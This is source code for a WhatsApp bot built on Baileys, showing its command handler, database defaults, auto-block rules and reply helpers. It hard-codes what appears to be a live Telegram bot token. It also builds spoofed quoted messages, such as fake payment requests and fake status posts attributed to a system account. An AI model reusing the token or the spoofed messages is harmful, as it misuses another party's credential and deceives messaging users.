//base by DGXeon
//recode by HiraaZxD

require('./lib/listmenu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { writeFile } = require('fs/promises')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const speedTest = require('speedtest-net')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const FormData = require('form-data')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./lib/scraper2') 
const ytdl = require('@distube/ytdl-core')
const textpro = require('./lib/textpro')
const absenData = {};
const { temporary, temmp } = require('./tempor')
const { PrexzyChat } = require('./lib/groq')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { CatBox, fileIO, pomfCDN } = require('./lib/uploader')
const { mediafireDl } = require('./lib/mediafire')

const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./lib/myfunc')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNotePrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/prexzyvn.json'))
const StickerPrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/prexzysticker.json'))
const ImagePrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/prexzyimage.json'))
const VideoPrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/prexzyvideo.json'))
const DocPrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/doc.json'))
const ZipPrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/zip.json'))
const ApkPrexzy = JSON.parse(fs.readFileSync('./PrexzyMedia/database/apk.json'))

const prexzyverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var prexzyvillatime = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var prexzyvillatime = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var prexzyvillatime = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var prexzyvillatime = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var prexzyvillatime = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var prexzyvillatime = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = PrexzyVilla = async (PrexzyVilla, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await PrexzyVilla.decodeJid(PrexzyVilla.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const prexzybody = body.startsWith(pric)
        const isCommand = prexzybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await PrexzyVilla.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isPrexzyMedia = m.mtype
        //user status
        const isUser = prexzyverifieduser.includes(sender)
        const PrexzyTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= PrexzyTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(PrexzyVilla, m, premium)
        
        //theme sticker reply
        const PrexzyStickWait = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/wait.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        const PrexzyStickAdmin = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/admin.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        const PrexzyStickBotAdmin = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/botadmin.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        const PrexzyStickOwner = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/owner.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        const PrexzyStickgroup = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/group.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        const PrexzyStickPrivate = () => {
        let PrexzyStikRep = fs.readFileSync('./PrexzyMedia/theme/sticker_reply/private.webp')
        PrexzyVilla.sendMessage(from, { sticker: PrexzyStikRep }, { quoted: m })
        }
        //premium
        async function replyprem(teks) {
    replygcprexzy(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendPrexzyVillaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await PrexzyVilla.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcprexzy(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                PrexzyVilla.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               PrexzyVilla.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
                           } else if (typereply === 'v4') {
                replygcPrexzy2(teks)
            }
        }
            
                //fake reply with channel link embedded
async function replygcPrexzy2(txt) {
const Prexzynewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363322892680943@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
sourceUrl: websitex
},
},
text: txt,
}
return PrexzyVilla.sendMessage(from, Prexzynewrep, {
quoted: m,
})
}
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=2349159895444:2349159895444\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        function getDevice(userJid) {
    let userDevice = PrexzyVilla.store.contacts[userJid]?.device || 'Unknown';

    const deviceMapping = {
        'android': '📱 Android',
        'ios': '🍏 iPhone (iOS)',
        'web': '💻 WhatsApp Web',
        'macos': '🖥️ macOS',
        'windows': '🖥️ Windows'
    };

    return deviceMapping[userDevice.toLowerCase()] || 'Unknown Device';
}
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = PrexzyVilla.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: PrexzyVilla.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: PrexzyVilla.getName(botNumber), alias: botname}, owner: { nick: PrexzyVilla.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: PrexzyVilla.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: PrexzyVilla.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  const { nyxpairing, conns } = require('./nyxpairing')      
//bug loading
async function loading () {
var prexzylod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"Nyx Loading🐦..."
]
let { key } = await PrexzyVilla.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < prexzylod.length; i++) {
await PrexzyVilla.sendMessage(from, {text: prexzylod[i], edit: key })
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcprexzy('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const prexzyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Prexzy',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            prexzyresult.push(result)
        }
    resolve(prexzyresult)
    })
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcprexzy(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitprexzy = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitprexzy
            }
            PrexzyVilla.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !PrexzyTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcprexzy(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!PrexzyTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcprexzy("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!PrexzyVilla.public) {
            if (PrexzyTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	PrexzyVilla.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            PrexzyVilla.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            PrexzyVilla.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let prexzymix = ['composing', 'recording']
            prexzymix2 = prexzymix[Math.floor(prexzymix.length * Math.random())]
            PrexzyVilla.sendPresenceUpdate(prexzymix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let prexzymix = ['recording']
            prexzymix2 = prexzymix[Math.floor(prexzymix.length * Math.random())]
            PrexzyVilla.sendPresenceUpdate(prexzymix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let prexzypos = ['composing']
            PrexzyVilla.sendPresenceUpdate(prexzypos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return PrexzyVilla.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return PrexzyVilla.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return PrexzyVilla.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (PrexzyTheCreator || isAdmins || !isBotAdmins) return
            PrexzyVilla.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await PrexzyVilla.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await PrexzyVilla.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await PrexzyVilla.getName(i)}\nFN:${await PrexzyVilla.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
